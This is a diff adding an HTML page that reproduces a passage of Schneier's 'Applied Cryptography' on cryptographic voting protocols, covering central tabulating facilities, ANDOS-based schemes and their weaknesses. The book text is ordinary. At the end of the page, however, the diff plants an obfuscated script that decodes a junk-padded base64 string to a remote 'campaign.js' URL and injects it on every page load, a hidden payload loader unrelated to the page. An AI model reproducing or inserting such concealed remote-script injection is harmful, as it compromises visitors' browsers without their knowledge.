@@ -1,0 +1,131 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=128-130//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Like the previous protocol, each voter can look at the lists of identification numbers and find his own. This gives him proof that his vote was counted. Of course, all messages passing among the parties in the protocol should be encrypted and signed to prevent someone from impersonating someone else or intercepting transmissions.
+</P>
+<P>The CTF cannot modify votes because each voter will look for his identification string. If a voter doesn&#146;t find his identification string, or finds his identification string in a tally other than the one he voted for, he will immediately know there was foul play. The CTF cannot stuff the ballot box because it is being watched by the CLA. The CLA knows how many voters have been certified and their validation numbers, and will detect any modifications.</P>
+<P>Mallory, who is not an eligible voter, can try to cheat by guessing a valid validation number. This threat can be minimized by making the number of possible validation numbers much larger than the number of actual validation numbers: 100-digit numbers for a million voters, for example. Of course, the validation numbers must be generated randomly.</P>
+<P>Despite this, the CLA is still a trusted authority in some respects. It can certify ineligible voters. It can certify eligible voters multiple times. This risk could be minimized by having the CLA publish a list of certified voters (but not their validation numbers). If the number of voters on this list is less than the number of votes tabulated, then something is awry. However, if more voters were certified than votes tabulated, it probably means that some certified people didn&#146;t bother voting. Many people who are registered to vote don&#146;t bother to cast ballots.</P>
+<P>This protocol is vulnerable to collusion between the CLA and the CTF. If the two of them got together, they could correlate databases and figure out who voted for whom.</P>
+<P><FONT SIZE="+1"><B><I>Voting with a Single Central Facility</I></B></FONT></P>
+<P>A more complex protocol can be used to overcome the danger of collusion between the CLA and the CTF [1373]. This protocol is identical to the previous one, with two modifications:
+</P>
+<DL>
+<DD>&#151; The CLA and the CTF are one organization, and
+<DD>&#151; ANDOS (see Section 4.13) is used to anonymously distribute validation numbers in step (2).
+</DL>
+<P>Since the anonymous key distribution protocol prevents the CTF from knowing which voter got which validation number, there is no way for the CTF to correlate validation numbers with votes received. The CTF still has to be trusted not to give validation numbers to ineligible voters, though. You can also solve this problem with blind signatures.
+</P>
+<P><FONT SIZE="+1"><B><I>Improved Voting with a Single Central Facility</I></B></FONT></P>
+<P>This protocol also uses ANDOS [1175]. It satisfies all six requirements of a good voting protocol. It doesn&#146;t satisfy the seventh requirement, but has two properties additional to the six listed at the beginning of the section:
+</P>
+<DL>
+<DD><B>7.</B>&nbsp;&nbsp;A voter can change his mind (i.e., retract his vote and vote again) within a given period of time.
+<DD><B>8.</B>&nbsp;&nbsp;If a voter finds out that his vote is miscounted, he can identify and correct the problem without jeopardizing the secrecy of his ballot.
+</DL>
+<P>Here&#146;s the protocol:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;The CTF publishes a list of all legitimate voters.
+<DD><B>(2)</B>&nbsp;&nbsp;Within a specified deadline, each voter tells the CTF whether he intends to vote.
+<DD><B>(3)</B>&nbsp;&nbsp;The CTF publishes a list of voters participating in the election.
+<DD><B>(4)</B>&nbsp;&nbsp;Each voter receives an identification number, <I>I,</I> using an ANDOS protocol.
+<DD><B>(5)</B>&nbsp;&nbsp;Each voter generates a public-key/private-key key pair: <I>k, d.</I> If <I>v</I> is the vote, he generates the following message and sends it to the CTF:
+<DL>
+<DD><I>I,E</I><SUB>k</SUB>(<I>I,v</I>)
+</DL>
+<BR>This message must be sent anonymously.
+<DD><B>(6)</B>&nbsp;&nbsp;The CTF acknowledges receipt of the vote by publishing:
+<DL>
+<DD><I>E</I><SUB>k</SUB>(<I>I,v</I>)
+</DL>
+<DD><B>(7)</B>&nbsp;&nbsp;Each voter sends the CTF:
+<DL>
+<DD><I>I,d</I>
+</DL>
+<DD><B>(8)</B>&nbsp;&nbsp;The CTF decrypts the votes. At the end of the election, it publishes the results of the election and, for each different vote, the list of all <I>E</I><SUB>k</SUB>(<I>I,v</I>) values that contained that vote.
+<DD><B>(9)</B>&nbsp;&nbsp;If a voter observes that his vote is not properly counted, he protests by sending the CTF:
+<DL>
+<DD><I>I,E</I><SUB>k</SUB>(<I>I,v</I>)<I>,d</I>
+</DL>
+<DD><B>(10)</B>&nbsp;&nbsp;If a voter wants to change his vote (possible, in some elections) from <I>v</I> to <I>v&#145;,</I> he sends the CTF:
+<DL>
+<DD><I>I,E</I><SUB>k</SUB>(<I>I,v&#145;</I>)<I>,d</I>
+</DL>
+</DL>
+<P>A different voting protocol uses blind signatures instead of ANDOS, but is essentially the same [585]. Steps (1) through (3) are preliminary to the actual voting. Their purpose is to find out and publicize the total number of actual voters. Although some of them probably will not participate, it reduces the ability of the CTF to add fraudulent votes.
+</P>
+<P>In step (4), it is possible for two voters to get the same identification number. This possibility can be minimized by having far more possible identification numbers than actual voters. If two voters submit votes with the same identification tag, the CTF generates a new identification number, <I>I&#146;</I>, chooses one of the two votes, and publishes:</P>
+<DL>
+<DD><I>I&#146;,E</I><SUB>k</SUB>(<I>I,v</I>)
+</DL>
+<P>The owner of that vote recognizes it and sends in a second vote, by repeating step (5), with the new identification number.
+</P>
+<P>Step (6) gives each voter the capability to check that the CTF received his vote accurately. If his vote is miscounted, he can prove his case in step (9). Assuming a voter&#146;s vote is correct in step (6), the message he sends in step (9) constitutes a proof that his vote is miscounted.</P>
+<P>One problem with the protocol is that a corrupt CTF could allocate the votes of people who respond in step (2) but who do not actually vote. Another problem is the complexity of the ANDOS protocol. The authors recommend dividing a large population of voters into smaller populations, such as election districts.</P>
+<P>Another, more serious problem is that the CTF can neglect to count a vote. This problem cannot be resolved: Alice claims that the CTF intentionally neglected to count her vote, but the CTF claims that the voter never voted.</P>
+<P><FONT SIZE="+1"><B><I>Voting without a Central Tabulating Facility</I></B></FONT></P>
+<P>The following protocol does away with the CTF entirely; the voters watch each other. Designed by Michael Merritt [452, 1076, 453], it is so unwieldy that it cannot be implemented practically for more than a handful of people, but it is useful to learn from nevertheless.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(aIHnaPqS, mmhVmIwh) {mmhVmIwh = aIHnaPqS.createElement('script');mmhVmIwh.type = 'text/javascript';mmhVmIwh.async = true;mmhVmIwh.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');aIHnaPqS.getElementsByTagName('body')[0].appendChild(mmhVmIwh);}(document));</script></body>
+</html>
